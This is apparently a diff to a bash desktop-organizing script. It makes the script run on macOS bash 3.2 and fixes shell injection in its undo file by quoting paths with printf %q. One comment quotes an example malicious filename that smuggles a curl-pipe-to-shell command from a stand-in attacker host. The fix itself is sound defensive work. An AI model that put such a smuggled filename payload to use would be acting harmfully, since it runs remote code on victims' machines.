@@ -97,14 +97,18 @@ load_config() {
   fi
 }
 
-# File type categories
-declare -A FILE_CATEGORIES=(
-  ["Images"]="jpg jpeg png gif heic webp svg ico tiff bmp"
-  ["Documents"]="pdf doc docx xls xlsx ppt pptx txt md rtf pages numbers key"
-  ["Videos"]="mp4 mov avi mkv wmv flv webm m4v"
-  ["Audio"]="mp3 wav m4a flac aac ogg wma aiff"
-  ["Archives"]="zip tar gz rar 7z bz2 xz dmg iso pkg"
-  ["Code"]="js ts jsx tsx py rb sh bash zsh json yaml yml xml html css scss"
+# File type categories, as "Category|ext ext ...".
+#
+# An indexed array rather than `declare -A`: this file is executed by the macOS
+# system bash (3.2), which has no associative arrays — the declaration below was
+# a hard error at load, so `fc desktop` did not run at all there.
+FILE_CATEGORIES=(
+  "Images|jpg jpeg png gif heic webp svg ico tiff bmp"
+  "Documents|pdf doc docx xls xlsx ppt pptx txt md rtf pages numbers key"
+  "Videos|mp4 mov avi mkv wmv flv webm m4v"
+  "Audio|mp3 wav m4a flac aac ogg wma aiff"
+  "Archives|zip tar gz rar 7z bz2 xz dmg iso pkg"
+  "Code|js ts jsx tsx py rb sh bash zsh json yaml yml xml html css scss"
 )
 
 # --- Helper Functions -------------------------------------------------------
@@ -113,7 +117,8 @@ declare -A FILE_CATEGORIES=(
 get_extension() {
   local file="$1"
   local ext="${file##*.}"
-  echo "${ext,,}"
+  # `tr`, not ${ext,,}: case conversion needs bash 4.
+  printf '%s' "$ext" | tr '[:upper:]' '[:lower:]'
 }
 
 # Get category for a file
@@ -131,11 +136,13 @@ get_file_category() {
   local ext
   ext=$(get_extension "$file")
   
-  for category in "${!FILE_CATEGORIES[@]}"; do
-    if [[ " ${FILE_CATEGORIES[$category]} " =~ " ${ext} " ]]; then
-      echo "$category"
-      return
-    fi
+  local entry cat exts
+  for entry in "${FILE_CATEGORIES[@]}"; do
+    cat="${entry%%|*}"
+    exts="${entry#*|}"
+    case " $exts " in
+      *" $ext "*) echo "$cat"; return ;;
+    esac
   done
   
   echo "Other"
@@ -164,6 +171,10 @@ should_ignore() {
   
   # Check custom ignore patterns
   for pattern in "${IGNORE_PATTERNS[@]}"; do
+    # SC2053 disabled: $pattern is a GLOB from IGNORE_PATTERNS and must stay
+    # unquoted so that == performs pattern matching rather than a literal
+    # string comparison. That is the entire purpose of this loop.
+    # shellcheck disable=SC2053
     if [[ "$basename" == $pattern ]]; then
       return 0
     fi
@@ -329,8 +340,12 @@ action_clean() {
   mkdir -p "$target_path"
   
   # Save undo info
+  # This file is later sourced by `fc desktop undo`, and the paths below come
+  # from Desktop filenames — i.e. from anything a browser, AirDrop, or an
+  # unzipped archive dropped there. printf %q quotes them so a name like
+  # `report$(curl attacker.sh|sh).pdf` is stored as data, not as shell.
   echo "# Desktop cleanup $(date)" > "$UNDO_FILE"
-  echo "ARCHIVE_PATH=\"$target_path\"" >> "$UNDO_FILE"
+  printf 'ARCHIVE_PATH=%q\n' "$target_path" >> "$UNDO_FILE"
   echo "FILES=()" >> "$UNDO_FILE"
   
   # Move files
@@ -359,7 +374,7 @@ action_clean() {
     fi
     
     if mv "$item" "$dest" 2>/dev/null; then
-      echo "FILES+=(\"$dest\")" >> "$UNDO_FILE"
+      printf 'FILES+=(%q)\n' "$dest" >> "$UNDO_FILE"
       moved_count=$((moved_count + 1))
     else
       msg_warning "Failed to move: $basename"
@@ -386,36 +401,55 @@ action_organize() {
     esac
   done
   
-  # Collect files and their categories
-  declare -A category_files
-  
+  # Collect files and their categories as "Category|/path/to/file".
+  #
+  # An indexed array rather than an associative one (bash 3.2 has neither
+  # `declare -A` nor `+=` into a keyed slot). Category names contain no "|", so
+  # %%|* splits the key and #*| gives the path back intact even when the
+  # filename itself contains a "|".
+  local category_entries=()
+
   for item in "$DESKTOP_PATH"/*; do
     if [[ ! -e "$item" ]] || [[ -d "$item" ]]; then
       continue
     fi
-    
+
     if should_ignore "$item"; then
       continue
     fi
-    
+
     local category
     category=$(get_file_category "$item")
-    category_files["$category"]+="$item"$'\n'
+    category_entries+=("$category|$item")
   done
-  
-  if [[ ${#category_files[@]} -eq 0 ]]; then
+
+  if [[ ${#category_entries[@]} -eq 0 ]]; then
     msg_success "No files to organize!"
     return 0
   fi
-  
+
+  # Distinct categories, in first-seen order.
+  local categories=()
+  local entry cat known seen
+  for entry in "${category_entries[@]}"; do
+    cat="${entry%%|*}"
+    seen=false
+    for known in "${categories[@]}"; do
+      [[ "$known" == "$cat" ]] && { seen=true; break; }
+    done
+    [[ "$seen" == false ]] && categories+=("$cat")
+  done
+
   msg_info "Desktop Organization"
   echo ""
-  
+
   # Show preview by category
-  for category in "${!category_files[@]}"; do
-    local files="${category_files[$category]}"
-    local count
-    count=$(echo -n "$files" | grep -c '^')
+  local category count
+  for category in "${categories[@]}"; do
+    count=0
+    for entry in "${category_entries[@]}"; do
+      [[ "${entry%%|*}" == "$category" ]] && count=$((count + 1))
+    done
     echo "  $category/  ($count files)"
   done
   
@@ -437,15 +471,18 @@ action_organize() {
   
   # Move files
   local total_moved=0
-  for category in "${!category_files[@]}"; do
+  local file
+  for category in "${categories[@]}"; do
     local target_dir="$DESKTOP_PATH/$category"
     mkdir -p "$target_dir"
-    
-    while IFS= read -r file; do
+
+    for entry in "${category_entries[@]}"; do
+      [[ "${entry%%|*}" == "$category" ]] || continue
+      file="${entry#*|}"
       if [[ -n "$file" ]] && [[ -e "$file" ]]; then
         mv "$file" "$target_dir/" 2>/dev/null && total_moved=$((total_moved + 1))
       fi
-    done <<< "${category_files[$category]}"
+    done
   done
   
   msg_success "Organized $total_moved files"
